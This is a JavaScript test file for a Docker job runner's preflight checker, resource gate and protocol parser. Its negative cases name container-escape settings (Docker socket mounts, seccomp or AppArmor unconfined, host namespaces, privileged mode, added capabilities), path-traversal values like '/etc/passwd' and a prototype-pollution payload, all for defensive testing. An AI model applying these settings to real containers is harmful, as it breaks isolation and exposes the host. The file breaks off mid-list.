'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const loadTs = require('./load-ts.cjs');
const { comparePreflight } = loadTs('src/shared/nexus/preflightCheck.ts');
const { evaluateGate, REQUIRED_FREE_BYTES, GIB } = loadTs('src/shared/nexus/resourceGate.ts');
const { parseRunnerMessage } = loadTs('src/shared/nexus/runnerProtocol.ts');
const gateMod = loadTs('src/shared/nexus/resourceGate.ts');
const proto = loadTs('src/shared/nexus/runnerProtocol.ts');
const ULID = '01J9Z3K4M5N6P7Q8R9S0T1V2W3';
const CID = 'c'.repeat(64);

// Fix round 1: the spec now carries the image identity, the entry and the image ENV allowlist, and the
// synthetic inspect carries every field the comparator requires (it fails closed on a missing one).
const IMG = 'sha256:' + 'a'.repeat(64);
const spec = { name: 'nexus-01J', profile: 'sde-node', argv: ['node', '--version'], env: { CI: '1' },
  image: { ref: 'nexus/sde-node@' + IMG, id: IMG }, entrypoint: ['/opt/nexus/nexus-entry', '60', '--'],
  imageEnv: ['PATH', 'HOME', 'LANG', 'NODE_VERSION'],
  labels: { 'nexus.job': 'J', 'nexus.attempt': 'A', 'nexus.boot': 'B', 'nexus.project': 'p' },
  mounts: [{ kind: 'out', hostPath: 'C:/x/out', containerPath: '/out', readOnly: false },
    { kind: 'input', hostPath: 'C:\\x\\in', containerPath: '/in', readOnly: true },
    { kind: 'workspace', hostPath: 'nexus-ws-A', containerPath: '/workspace', readOnly: false }],
  network: { mode: 'none' }, limits: { cpus: 2, memoryMb: 2048, pids: 512, wallClockMs: 60000, outputMaxBytes: 1 << 20, tmpfsMb: 512 },
  readOnlyRootfs: true, capDrop: ['ALL'], noNewPrivileges: true };
const good = () => ({ Image: IMG,
  Config: { User: '10001:10001', Labels: { ...spec.labels }, Image: 'nexus/sde-node@' + IMG,
    Entrypoint: ['/opt/nexus/nexus-entry', '60', '--'], Cmd: ['node', '--version'],
    Env: ['PATH=/usr/local/bin:/usr/bin:/bin', 'NODE_VERSION=20.18.0', 'CI=1'] },
  HostConfig: { NanoCpus: 2e9, Memory: 2048 * 2 ** 20, MemorySwap: 2048 * 2 ** 20, PidsLimit: 512, NetworkMode: 'none',
    ReadonlyRootfs: true, CapDrop: ['ALL'], CapAdd: null, Privileged: false, SecurityOpt: ['no-new-privileges'],
    Tmpfs: { '/tmp': 'rw,noexec,nosuid,size=512m,uid=10001', '/home/nexus': 'rw,nosuid,size=256m,uid=10001' },
    PortBindings: {}, Devices: [], IpcMode: 'private', CgroupnsMode: 'private', PidMode: '', UTSMode: '', UsernsMode: '',
    RestartPolicy: { Name: 'no', MaximumRetryCount: 0 }, AutoRemove: false, Runtime: 'runc', CgroupParent: '',
    OomKillDisable: false, PublishAllPorts: false, GroupAdd: null, Sysctls: null, Ulimits: [], Binds: null },
  Mounts: [
    { Destination: '/out', Source: '/run/desktop/mnt/host/c/x/out', RW: true, Type: 'bind', Mode: '', Propagation: 'rprivate' },
    { Destination: '/in', Source: '/run/desktop/mnt/host/c/x/in', RW: false, Type: 'bind', Mode: '', Propagation: 'rprivate' },
    { Destination: '/workspace', Name: 'nexus-ws-A', Source: '/var/lib/docker/volumes/nexus-ws-A/_data', RW: true, Type: 'volume',
      Mode: '', Propagation: '' }],
  NetworkSettings: { Networks: { none: {} } } });

test('PF1 a container matching its spec passes', () => assert.deepEqual(comparePreflight(spec, good()).problems, []));
for (const [name, mutate, expect] of [
  ['no cpu limit', (i) => { i.HostConfig.NanoCpus = 0; }, /cpus/],
  ['memory without swap cap', (i) => { i.HostConfig.MemorySwap = -1; }, /memory/],
  ['no pids limit', (i) => { i.HostConfig.PidsLimit = null; }, /pids/],
  ['writable root', (i) => { i.HostConfig.ReadonlyRootfs = false; }, /read-only root/],
  ['caps added', (i) => { i.HostConfig.CapAdd = ['NET_ADMIN']; }, /capabilities/],
  ['privileged', (i) => { i.HostConfig.Privileged = true; }, /privileged/],
  ['no no-new-privileges', (i) => { i.HostConfig.SecurityOpt = []; }, /no-new-privileges/],
  ['root user', (i) => { i.Config.User = ''; }, /user/],
  ['bridge network', (i) => { i.HostConfig.NetworkMode = 'bridge'; }, /network/],
  ['extra mount', (i) => { i.Mounts.push({ Destination: '/var/run/docker.sock', RW: true, Type: 'bind' }); }, /mount/],
  ['out mounted read-only', (i) => { i.Mounts[0].RW = false; }, /mount/],
  ['port on 0.0.0.0', (i) => { i.HostConfig.PortBindings = { '8080/tcp': [{ HostIp: '0.0.0.0', HostPort: '5000' }] }; }, /port/],
  ['tmpfs without size', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'rw'; }, /tmpfs/],
  ['device passed', (i) => { i.HostConfig.Devices = [{ PathOnHost: '/dev/kvm' }]; }, /device/],
  ['label missing', (i) => { delete i.Config.Labels['nexus.attempt']; }, /label/],
  ['garbage inspect', () => null, /inspect/]
]) test(`PF2 ${name} is refused`, () => {
  const i = good(); const r = mutate(i); const report = comparePreflight(spec, r === null ? null : i);
  assert.equal(report.ok, false); assert.ok(report.problems.some((p) => expect.test(p)), report.problems.join('; '));
});

// ----- more preflight rules -----
for (const [name, mutate, expect] of [
  ['the one-element array docker inspect prints is accepted', (i) => [i], null],
  ['CapAdd [] is the same as null', (i) => { i.HostConfig.CapAdd = []; }, null],
  ['Tmpfs options in another order are the same', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'uid=10001,size=512m,nosuid,noexec,rw'; }, null],
  ['an image label in addition to the spec labels is fine', (i) => { i.Config.Labels['nexus.profile'] = 'sde-node'; }, null],
  ['a two-element inspect array', (i) => [i, i], /2 records/],
  ['seccomp unconfined', (i) => { i.HostConfig.SecurityOpt.push('seccomp=unconfined'); }, /not allowed/],
  ['host pid namespace', (i) => { i.HostConfig.PidMode = 'host'; }, /PidMode/],
  ['tmpfs missing entirely', (i) => { delete i.HostConfig.Tmpfs; }, /tmpfs/],
  ['extra tmpfs', (i) => { i.HostConfig.Tmpfs['/var'] = 'rw,size=1m'; }, /unexpected tmpfs/],
  ['/tmp tmpfs is executable', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'rw,nosuid,size=512m,uid=10001'; }, /tmpfs \/tmp/],
  ['GPU request', (i) => { i.HostConfig.DeviceRequests = [{ Driver: 'nvidia' }]; }, /device requests/],
  ['label value differs', (i) => { i.Config.Labels['nexus.boot'] = 'other'; }, /label nexus.boot/],
  ['memory limit differs', (i) => { i.HostConfig.Memory = 1024 * 2 ** 20; }, /memory limit/],
  ['out mount is a volume', (i) => { i.Mounts[0].Type = 'volume'; }, /expected bind/],
  ['out mount missing', (i) => { i.Mounts = []; }, /mount \/out is missing/],
  ['a second network endpoint', (i) => { i.NetworkSettings.Networks.bridge = {}; }, /endpoint bridge/],
  ['publish all ports', (i) => { i.HostConfig.PublishAllPorts = true; }, /published/],
  ['HostConfig missing', (i) => { delete i.HostConfig; }, /HostConfig/],
  ['a string instead of a record', () => 'not json', /inspect/]
]) test(`PF3 ${name}`, () => {
  const i = good(); const r = mutate(i); const report = comparePreflight(spec, r === undefined ? i : r);
  if (expect === null) { assert.deepEqual(report.problems, []); assert.equal(report.ok, true); return; }
  assert.equal(report.ok, false); assert.ok(report.problems.some((p) => expect.test(p)), report.problems.join('; '));
});

test('PF4 networks: an approved install maps to the job\'s INTERNAL egress network only (B2a stabilization), service to its internal network; the forwarder may publish only on 127.0.0.1', () => {
  const egress = { ...spec, network: { mode: 'egress-approved', approvalId: 'X', purpose: 'deps' } };
  const i = good(); i.HostConfig.NetworkMode = 'nexus-egress-in-J'; i.NetworkSettings.Networks = { 'nexus-egress-in-J': {} };
  assert.deepEqual(comparePreflight(egress, i).problems, []);
  // The old per-job bridge (a route out) is refused, and so is the outbound bridge beside the internal network.
  const old = good(); old.HostConfig.NetworkMode = 'nexus-egress-J'; old.NetworkSettings.Networks = { 'nexus-egress-J': {} };
  assert.ok(comparePreflight(egress, old).problems.some((p) => /expected nexus-egress-in-J/.test(p)));
  const both = good(); both.HostConfig.NetworkMode = 'nexus-egress-in-J'; both.NetworkSettings.Networks = { 'nexus-egress-in-J': {}, 'nexus-egress-out-J': {} };
  assert.ok(comparePreflight(egress, both).problems.some((p) => /nexus-egress-out-J is attached/.test(p)));
  const fwd = { ...spec, publish: { hostIp: '127.0.0.1', hostPort: 41234, containerPort: 8080 } };
  const f = good(); f.HostConfig.PortBindings = { '8080/tcp': [{ HostIp: '127.0.0.1', HostPort: '41234' }] };
  assert.deepEqual(comparePreflight(fwd, f).problems, []);
  const wide = good(); wide.HostConfig.PortBindings = { '8080/tcp': [{ HostIp: '', HostPort: '41234' }] };
  const r = comparePreflight(fwd, wide);
  assert.ok(r.problems.some((p) => /0\.0\.0\.0/.test(p)), r.problems.join('; '));
  assert.ok(comparePreflight(fwd, good()).problems.some((p) => /not published/.test(p)));
});

test('PF5 the report is bounded and its observed values are always filled, even for garbage', () => {
  const g = comparePreflight(spec, undefined);
  assert.equal(g.ok, false); assert.equal(g.observed.nanoCpus, 0); assert.deepEqual(g.observed.mounts, []);
  const i = good();
  for (let n = 0; n < 200; n++) i.Mounts.push({ Destination: `/m${n}/${'x'.repeat(1000)}`, RW: true, Type: 'bind' });
  const r = comparePreflight(spec, i);
  assert.ok(r.problems.length <= 64); assert.ok(r.problems.every((p) => p.length <= 512));
  assert.ok(r.observed.mounts.length <= 64);
  assert.ok(parseRunnerMessage({ op: 'attempt.provisioned', attemptId: ULID, containerId: CID, preflight: r }),
    'a comparator report always fits the protocol');
  const ok = comparePreflight(spec, good());
  assert.ok(parseRunnerMessage({ op: 'attempt.provisioned', attemptId: ULID, containerId: CID, preflight: ok }));
});

// ----- the resource gate -----
test('G1 below 30 GiB free is below_required with the exact numbers; 30–40 is below_recommended', () => {
  const probe = { docker: 'running', cpus: 16, memoryBytes: 8172232704, gpu: { detected: false, usableInContainers: false } };
  const low = evaluateGate(probe, 18 * 10 ** 9, []);
  assert.equal(low.gate, 'below_required');
  assert.deepEqual(low.problems.find((p) => p.id === 'disk_low'), { id: 'disk_low', freeBytes: 18e9, requiredBytes: REQUIRED_FREE_BYTES });
  assert.equal(evaluateGate(probe, 35 * GIB, []).gate, 'below_recommended');
  assert.equal(evaluateGate(probe, 41 * GIB, []).gate, 'ok');
  assert.equal(evaluateGate({ ...probe, docker: 'stopped' }, 41 * GIB, []).problems[0].id, 'docker_stopped');
  assert.equal(evaluateGate({ ...probe, memoryBytes: 2 * GIB }, 41 * GIB, []).problems[0].id, 'docker_memory_low');
});
const probe = { docker: 'running', cpus: 16, memoryBytes: 8172232704, gpu: { detected: false, usableInContainers: false } };
test('G2 the lease floor is max(5 GiB, 2 × outputMaxBytes)', () => {
  assert.equal(gateMod.leaseFloorBytes(1 << 20), 5 * GIB);
  assert.equal(gateMod.leaseFloorBytes(256 * 2 ** 20), 5 * GIB);
  assert.equal(gateMod.leaseFloorBytes(3 * GIB), 6 * GIB);
  assert.equal(gateMod.leaseFloorBytes(NaN), 5 * GIB);
  assert.equal(gateMod.leaseFloorBytes(-1), 5 * GIB);
});
test('G3 the gate is in GiB, stricter than GB, and the formatter states both', () => {
  assert.equal(GIB, 1073741824);
  assert.equal(REQUIRED_FREE_BYTES, 32212254720); assert.ok(REQUIRED_FREE_BYTES > 30e9);
  assert.equal(gateMod.RECOMMENDED_FREE_BYTES, 40 * GIB);
  assert.equal(gateMod.MIN_DOCKER_MEMORY, 4 * GIB); assert.equal(gateMod.MIN_DOCKER_CPUS, 2);
  assert.equal(gateMod.formatGateBytes(REQUIRED_FREE_BYTES), '30 GiB (32.2 GB)');
  assert.equal(gateMod.formatGateBytes(18e9), '16.8 GiB (18 GB)');
  assert.equal(evaluateGate(probe, 30e9, []).gate, 'below_required', '30 GB (decimal) is below 30 GiB');
});
test('G4 Docker missing is the only Docker problem; nothing about memory, CPUs or images is guessed', () => {
  const r = evaluateGate({ docker: 'missing', gpu: { detected: false, usableInContainers: false } }, 50 * GIB,
    [{ profile: 'sde-node', present: false, digestMatches: false }]);
  assert.equal(r.gate, 'below_required'); assert.deepEqual(r.problems, [{ id: 'docker_missing' }]);
  assert.deepEqual(evaluateGate({ gpu: { detected: false, usableInContainers: false } }, 50 * GIB, []).problems, [{ id: 'docker_missing' }]);
});
test('G5 image problems are listed per profile, in order', () => {
  const r = evaluateGate(probe, 50 * GIB, [
    { profile: 'sde-node', present: false, digestMatches: false },
    { profile: 'sde-python', present: true, digestMatches: false },
    { profile: 'nexus-fwd', present: true, digestMatches: true }]);
  assert.equal(r.gate, 'below_required');
  assert.deepEqual(r.problems, [{ id: 'image_missing', profile: 'sde-node' }, { id: 'image_mismatch', profile: 'sde-python' }]);
});
test('G6 Docker memory and CPUs below the minimum carry exact numbers; unknown counts are null', () => {
  assert.deepEqual(evaluateGate({ ...probe, cpus: 1 }, 50 * GIB, []).problems, [{ id: 'docker_cpus_low', cpus: 1, requiredCpus: 2 }]);
  assert.deepEqual(evaluateGate({ ...probe, memoryBytes: 2 * GIB }, 50 * GIB, []).problems,
    [{ id: 'docker_memory_low', memoryBytes: 2 * GIB, requiredBytes: 4 * GIB }]);
  const unknown = evaluateGate({ docker: 'running', gpu: { detected: false, usableInContainers: false } }, 50 * GIB, []);
  assert.deepEqual(unknown.problems.map((p) => p.id), ['docker_memory_low', 'docker_cpus_low']);
  assert.equal(unknown.problems[0].memoryBytes, null); assert.equal(unknown.problems[1].cpus, null);
});
test('G7 an unreadable free-space figure is disk_low with freeBytes null, never a pass', () => {
  for (const bad of [NaN, -1, Infinity, undefined, '50000000000']) {
    const r = evaluateGate(probe, bad, []);
    assert.equal(r.gate, 'below_required');
    assert.deepEqual(r.problems[0], { id: 'disk_low', freeBytes: null, requiredBytes: REQUIRED_FREE_BYTES });
  }
});
test('G8 boundaries: exactly 30 GiB meets the requirement, exactly 40 GiB is ok; problems come in a fixed order; inputs are not mutated', () => {
  assert.equal(evaluateGate(probe, 30 * GIB, []).gate, 'below_recommended');
  assert.equal(evaluateGate(probe, 30 * GIB - 1, []).gate, 'below_required');
  assert.equal(evaluateGate(probe, 40 * GIB, []).gate, 'ok');
  assert.equal(evaluateGate(probe, 40 * GIB - 1, []).gate, 'below_recommended');
  const p = { ...probe, cpus: 1, memoryBytes: 1 }; const before = JSON.stringify(p);
  const r = evaluateGate(p, 1, [{ profile: 'sde-node', present: false, digestMatches: false }]);
  assert.deepEqual(r.problems.map((x) => x.id), ['disk_low', 'docker_memory_low', 'docker_cpus_low', 'image_missing']);
  assert.equal(JSON.stringify(p), before);
  assert.deepEqual(evaluateGate(probe, 50 * GIB, []).problems, []);
});

// ----- the runner protocol parser -----
const SHA = 'a'.repeat(64);
const exit = { code: 0, oomKilled: false, finishedAt: 1700000000000 };
const SAMPLES = {
  // B2b Task 1: `ready` reports the runner's loopback MCP endpoint (null while it serves none), and four ops are added
  // (their bounds are pinned in test/nexus-core-agent-contracts.test.cjs, SC1).
  'ready': { op: 'ready', bootId: ULID, mcpUrl: 'http://127.0.0.1:51234/mcp' },
  'mcp.call': { op: 'mcp.call', callId: 'c-1', bearer: 'A'.repeat(22) + '.' + 'b'.repeat(43), tool: 'context_get', args: {} },
  'agent.exec.done': { op: 'agent.exec.done', attemptId: ULID, execId: 'e-1', exit, stdoutBytes: 1, stderrBytes: 0, stdoutSha256: SHA, truncated: false },
  'attempt.runtime': { op: 'attempt.runtime', attemptId: ULID, seq: 1, event: { t: 'run.cancelled', at: 5 } },
  'git.read.result': { op: 'git.read.result', reqId: 'r-1', result: { ok: false, code: 'git_missing', message: 'git is not installed' } },
  'probe.result': { op: 'probe.result', probe: { ...probe, version: '29.7.2' },
    images: [{ profile: 'sde-node', present: true, digestMatches: true, sizeBytes: 1, imageId: 'sha256:' + SHA }],
    freeBytes: 18e9, runtimes: [] },
  'attempt.provisioned': { op: 'attempt.provisioned', attemptId: ULID, containerId: CID, imageDigest: 'sha256:' + SHA,
    preflight: { ok: false, observed: {}, problems: ['network is bridge, expected none'] } },
  'attempt.refused': { op: 'attempt.refused', attemptId: ULID, reason: 'docker_stopped' },
  'attempt.event': { op: 'attempt.event', attemptId: ULID, seq: 3, event: { t: 'phase', phase: 'running', at: 5 } },
  'attempt.heartbeat': { op: 'attempt.heartbeat', attemptId: ULID, at: 5, logBytes: 0, outBytes: 0, container: 'running' },
  'attempt.exited': { op: 'attempt.exited', attemptId: ULID, exit, logBytes: 10,
    outputs: [{ relPath: 'junit.xml', sha256: SHA, bytes: 100, mediaType: 'application/xml' }],
    parsed: [{ parser: 'junit', sourceSha256: SHA, normalized: { total: 1, cases: [{ id: 'a', outcome: 'passed', ms: 1 }] } }] },
  'reconcile.result': { op: 'reconcile.result', docker: 'running',
    attempts: [{ attemptId: ULID, container: 'exited', containerId: CID, exit }],
    labelled: [{ kind: 'volume', id: 'nexus-ws-' + ULID, labels: { 'nexus.attempt': ULID } }] },
  'service.health': { op: 'service.health', attemptId: ULID, at: 5, status: 200, ms: 12, container: 'running' },
  'image.build.progress': { op: 'image.build.progress', buildId: ULID, at: 5, phase: 'pulling base', bytes: 100 },
  'image.build.done': { op: 'image.build.done', buildId: ULID, outcome: 'succeeded', imageId: 'sha256:' + SHA, sizeBytes: 900 },
  'blob.verified': { op: 'blob.verified', sha256: SHA, ok: true },
  'gc.result': { op: 'gc.result', scanId: ULID, objects: [{ sha256: SHA, bytes: 3 }], workDirs: [{ jobId: ULID, attemptN: 1, mtime: 5 }], truncated: false },
  'fault': { op: 'fault', message: 'ok' }
};
const clone = (x) => JSON.parse(JSON.stringify(x));

test('RP1 runner messages: unknown op, extra keys, oversized strings, bad ids and non-monotonic shapes are dropped', () => {
  assert.equal(parseRunnerMessage({ op: 'attempt.exited', attemptId: 'x' }), null);
  assert.equal(parseRunnerMessage({ op: 'evil' }), null);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x'.repeat(5000) }), null);
  assert.equal(parseRunnerMessage(Object.create({ op: 'fault', message: 'inherited' })), null);
  assert.ok(parseRunnerMessage({ op: 'fault', message: 'ok' }));
});
test('RP1b a fault names its attempt only with a failure class (both or neither)', () => {
  assert.deepEqual(parseRunnerMessage({ op: 'fault', message: 'no space left on device', attemptId: ULID, failureClass: 'disk_full' }),
    { op: 'fault', message: 'no space left on device', attemptId: ULID, failureClass: 'disk_full' });
  for (const c of ['disk_full', 'docker_resources', 'docker_error']) assert.ok(parseRunnerMessage({ op: 'fault', message: 'x', attemptId: ULID, failureClass: c }), c);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x', attemptId: ULID }), null);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x', failureClass: 'disk_full' }), null);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x', attemptId: 'not-a-ulid', failureClass: 'disk_full' }), null);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x', attemptId: ULID, failureClass: 'oom' }), null);
});
test('RP2 every RunnerToMain op has a sample that parses, and its exact key set is enforced', () => {
  assert.deepEqual([...proto.RUNNER_OPS].sort(), Object.keys(SAMPLES).sort());
  for (const [op, sample] of Object.entries(SAMPLES)) {
    assert.deepEqual(parseRunnerMessage(clone(sample)), sample, op);
    assert.equal(parseRunnerMessage({ ...clone(sample), extra: 1 }), null, `${op} with an extra key`);
    for (const k of Object.keys(sample)) {
      if (k === 'op') continue;
      const m = clone(sample); delete m[k];
      const optional = { 'attempt.provisioned': ['imageDigest'], 'attempt.heartbeat': ['container'],
        'image.build.progress': ['bytes'] }[op] ?? [];
      if (optional.includes(k)) assert.ok(parseRunnerMessage(m), `${op} without optional ${k}`);
      else assert.equal(parseRunnerMessage(m), null, `${op} without ${k}`);
    }
  }
});
test('RP3 bounds: 4 KiB strings in UTF-8, 20,000-item arrays, safe-integer seq, ULID ids, hex hashes', () => {
  assert.ok(parseRunnerMessage({ op: 'fault', message: 'x'.repeat(4096) }));
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'é'.repeat(2049) }), null, '4098 UTF-8 bytes');
  const objects = (n) => Array.from({ length: n }, () => ({ sha256: SHA, bytes: 1 }));
  assert.ok(parseRunnerMessage({ ...SAMPLES['gc.result'], objects: objects(20000) }));
  assert.equal(parseRunnerMessage({ ...SAMPLES['gc.result'], objects: objects(20001) }), null);
  for (const seq of [-1, 1.5, 2 ** 53, '3', NaN, null]) {
    assert.equal(parseRunnerMessage({ ...SAMPLES['attempt.event'], seq }), null, `seq ${seq}`);
  }
  for (const id of ['x', ULID.toLowerCase(), ULID.slice(1), ULID.slice(0, 25) + 'U', ULID + 'A']) {
    assert.equal(parseRunnerMessage({ ...SAMPLES['attempt.heartbeat'], attemptId: id }), null, `id ${id}`);
  }
  assert.equal(parseRunnerMessage({ ...SAMPLES['blob.verified'], sha256: SHA.toUpperCase() }), null);
  assert.equal(parseRunnerMessage({ ...SAMPLES['attempt.provisioned'], containerId: 'abc' }), null);
  assert.equal(parseRunnerMessage({ ...SAMPLES['attempt.refused'], reason: 'because' }), null);
  assert.equal(parseRunnerMessage({ ...SAMPLES['service.health'], status: 99 }), null);
  const prov = clone(SAMPLES['attempt.provisioned']); prov.preflight.ok = true;
  assert.equal(parseRunnerMessage(prov), null, 'ok with problems is inconsistent');
  const bad = clone(SAMPLES['probe.result']); bad.probe.gpu.usableInContainers = true;
  assert.equal(parseRunnerMessage(bad), null, 'GPUs are never usable in containers in B2a');
  for (const relPath of ['../x', '/etc/passwd', 'a\\b', 'C:/x', 'a//b', 'a/./b', 'a\0b', '']) {
    const m = clone(SAMPLES['attempt.exited']); m.outputs[0].relPath = relPath;
    assert.equal(parseRunnerMessage(m), null, `relPath ${JSON.stringify(relPath)}`);
  }
  const lbl = clone(SAMPLES['reconcile.result']); lbl.labelled[0].labels = { 'Bad Key': 'x' };
  assert.equal(parseRunnerMessage(lbl), null);
  const done = (o) => parseRunnerMessage({ op: 'image.build.done', buildId: ULID, ...o });
  assert.equal(done({ outcome: 'succeeded' }), null, 'success needs an image id and size');
  assert.equal(done({ outcome: 'failed' }), null, 'failure needs an error');
  assert.ok(done({ outcome: 'failed', error: 'build step 3 failed' }));
  assert.ok(done({ outcome: 'cancelled' }));
  assert.equal(done({ outcome: 'cancelled', imageId: 'sha256:' + SHA }), null);
});
test('RP4 ParsedOutput.normalized is plain bounded JSON, deep-copied', () => {
  const withNorm = (normalized) => { const m = clone(SAMPLES['attempt.exited']); m.parsed[0].normalized = normalized; return m; };
  let deep = 1; for (let i = 0; i < 20; i++) deep = [deep];
  const keys = Object.fromEntries(Array.from({ length: 257 }, (_, i) => [`k${i}`, i]));
  const protoKey = JSON.parse('{"__proto__": {"polluted": true}}');
  for (const [name, v] of [['NaN', NaN], ['Infinity', Infinity], ['a function', () => 1], ['a symbol', Symbol('s')],
    ['a Date', new Date()], ['a Map', new Map()], ['too deep', deep], ['too many keys', keys], ['a __proto__ key', protoKey],
    ['undefined', undefined], ['a big string', 'x'.repeat(5000)], ['a sparse array', [1, , 3]]]) {
    assert.equal(parseRunnerMessage(withNorm(v)), null, name);
  }
  const src = { total: 2, cases: [{ id: 'a' }, { id: 'b' }], nested: { ok: true, n: null } };
  const m = withNorm(src);
  const out = parseRunnerMessage(m);
  assert.deepEqual(out.parsed[0].normalized, src);
  assert.notEqual(out.parsed[0].normalized, m.parsed[0].normalized);
  m.parsed[0].normalized.cases[0].id = 'changed';
  assert.equal(out.parsed[0].normalized.cases[0].id, 'a');
  assert.equal({}.polluted, undefined);
  assert.equal(parseRunnerMessage({ ...withNorm(1), parsed: [{ parser: 'yaml', sourceSha256: SHA, normalized: 1 }] }), null);
});
test('RP5 the parser returns a fresh copy, never the input', () => {
  const input = clone(SAMPLES['attempt.exited']);
  const out = parseRunnerMessage(input);
  assert.notEqual(out, input); assert.notEqual(out.outputs, input.outputs); assert.notEqual(out.exit, input.exit);
  input.outputs[0].relPath = 'changed';
  assert.equal(out.outputs[0].relPath, 'junit.xml');
});
test('RP6 non-plain inputs are dropped: primitives, arrays, class instances, accessors, symbols, throwing proxies', () => {
  for (const v of [null, undefined, 'fault', 42, [], [SAMPLES.fault], new Map([['op', 'fault']])]) assert.equal(parseRunnerMessage(v), null);
  class Msg { constructor() { this.op = 'fault'; this.message = 'x'; } }
  assert.equal(parseRunnerMessage(new Msg()), null);
  const getter = { op: 'fault' }; Object.defineProperty(getter, 'message', { get: () => 'x', enumerable: true });
  assert.equal(parseRunnerMessage(getter), null);
  const hidden = { op: 'fault', message: 'x' }; Object.defineProperty(hidden, 'secret', { value: 1, enumerable: false });
  assert.equal(parseRunnerMessage(hidden), null);
  assert.equal(parseRunnerMessage({ op: 'fault', message: 'x', [Symbol('s')]: 1 }), null);
  const trap = new Proxy({ op: 'fault', message: 'x' }, { getOwnPropertyDescriptor: () => { throw new Error('trap'); } });
  assert.equal(parseRunnerMessage(trap), null);
  assert.ok(parseRunnerMessage(Object.assign(Object.create(null), { op: 'fault', message: 'null prototype is plain' })));
  const arr = [1, 2]; arr.extra = 1;
  assert.equal(parseRunnerMessage({ ...SAMPLES['gc.result'], objects: arr }), null, 'an array with extra properties');
});

// ----- fix round 1: every bypass the review found, each one must FAIL preflight -----
const REVIEW_BYPASSES = [
  ['/out Source = docker socket', (i) => { i.Mounts[0].Source = '/var/run/docker.sock'; }, /Docker socket/],
  ['/out Source under the docker socket', (i) => { i.Mounts[0].Source = '/run/docker.sock/x'; }, /Docker socket/],
  ['/in Source = host root /', (i) => { i.Mounts[1].Source = '/'; }, /host root/],
  ['/in Source = a whole host drive', (i) => { i.Mounts[1].Source = '/run/desktop/mnt/host/c'; }, /whole host drive/],
  ['/in Source = the engine pipe', (i) => { i.Mounts[1].Source = '\\\\.\\pipe\\docker_engine'; }, /engine pipe/],
  ['/in Source is another host folder', (i) => { i.Mounts[1].Source = '/run/desktop/mnt/host/c/Users'; }, /source/],
  ['/workspace volume is another volume', (i) => { i.Mounts[2].Name = 'someone-elses'; }, /volume/],
  ['/in RW missing (read-only spec)', (i) => { delete i.Mounts[1].RW; }, /RW flag is unreadable/],
  ['/in RW "true" string', (i) => { i.Mounts[1].RW = 'true'; }, /RW flag is unreadable/],
  ['/in Mode rw but RW false', (i) => { i.Mounts[1].Mode = 'rw'; }, /contradicts/],
  ['/in Mode z', (i) => { i.Mounts[1].Mode = 'z'; }, /mode/],
  ['bind Propagation rshared', (i) => { i.Mounts[0].Propagation = 'rshared'; }, /propagation/],
  ['PidMode container:x', (i) => { i.HostConfig.PidMode = 'container:abc'; }, /PidMode/],
  ['IpcMode container:x', (i) => { i.HostConfig.IpcMode = 'container:abc'; }, /IpcMode/],
  ['IpcMode shareable', (i) => { i.HostConfig.IpcMode = 'shareable'; }, /IpcMode/],
  ['IpcMode missing', (i) => { delete i.HostConfig.IpcMode; }, /IpcMode/],
  ['PidMode HOST uppercase', (i) => { i.HostConfig.PidMode = 'HOST'; }, /PidMode/],
  ['UTSMode host', (i) => { i.HostConfig.UTSMode = 'host'; }, /UTSMode/],
  ['UsernsMode host', (i) => { i.HostConfig.UsernsMode = 'host'; }, /UsernsMode/],
  ['CgroupnsMode host', (i) => { i.HostConfig.CgroupnsMode = 'host'; }, /CgroupnsMode/],
  ['NetworkMode host', (i) => { i.HostConfig.NetworkMode = 'host'; }, /network/],
  ['NetworkMode None', (i) => { i.HostConfig.NetworkMode = 'None'; }, /network/],
  ['NetworkMode container:x', (i) => { i.HostConfig.NetworkMode = 'container:x'; }, /network/],
  ['Networks extra host', (i) => { i.NetworkSettings.Networks.host = {}; }, /endpoint host/],
  ['NetworkSettings missing', (i) => { delete i.NetworkSettings; }, /endpoints are unreadable/],
  ['Networks null', (i) => { i.NetworkSettings.Networks = null; }, /endpoints are unreadable/],
  ['Networks empty', (i) => { i.NetworkSettings.Networks = {}; }, /not attached/],
  ['custom seccomp profile', (i) => { i.HostConfig.SecurityOpt.push('seccomp={"defaultAction":"SCMP_ACT_ALLOW"}'); }, /not allowed/],
  ['apparmor unconfined', (i) => { i.HostConfig.SecurityOpt.push('apparmor=unconfined'); }, /not allowed/],
  ['apparmor custom', (i) => { i.HostConfig.SecurityOpt.push('apparmor=docker-permissive'); }, /not allowed/],
  ['label type spc_t', (i) => { i.HostConfig.SecurityOpt.push('label=type:spc_t'); }, /not allowed/],
  ['systempaths unconfined', (i) => { i.HostConfig.SecurityOpt.push('systempaths=unconfined'); }, /not allowed/],
  ['nnp false', (i) => { i.HostConfig.SecurityOpt = ['no-new-privileges:false']; }, /no-new-privileges/],
  ['nnp upper', (i) => { i.HostConfig.SecurityOpt = ['NO-NEW-PRIVILEGES']; }, /no-new-privileges/],
  ['nnp + nnp=false', (i) => { i.HostConfig.SecurityOpt.push('no-new-privileges=false'); }, /not allowed/],
  ['nnp twice', (i) => { i.HostConfig.SecurityOpt.push('no-new-privileges:true'); }, /repeat/],
  ['CapDrop missing', (i) => { delete i.HostConfig.CapDrop; }, /capabilities/],
  ['CapAdd ALL', (i) => { i.HostConfig.CapAdd = ['ALL']; }, /capabilities/],
  ['CapAdd string', (i) => { i.HostConfig.CapAdd = 'SYS_ADMIN'; }, /capabilities/],
  ['Privileged missing', (i) => { delete i.HostConfig.Privileged; }, /privileged/],
  ['Privileged "false" string', (i) => { i.HostConfig.Privileged = 'false'; }, /privileged/],
  ['ReadonlyRootfs "true"', (i) => { i.HostConfig.ReadonlyRootfs = 'true'; }, /read-only root/],
  ['Memory 0', (i) => { i.HostConfig.Memory = 0; }, /memory/],
  ['Memory huge', (i) => { i.HostConfig.Memory = 2 ** 40; i.HostConfig.MemorySwap = 2 ** 40; }, /memory/],
  ['MemorySwap 0', (i) => { i.HostConfig.MemorySwap = 0; }, /memory/],
  ['NanoCpus 3e9', (i) => { i.HostConfig.NanoCpus = 3e9; }, /cpus/],
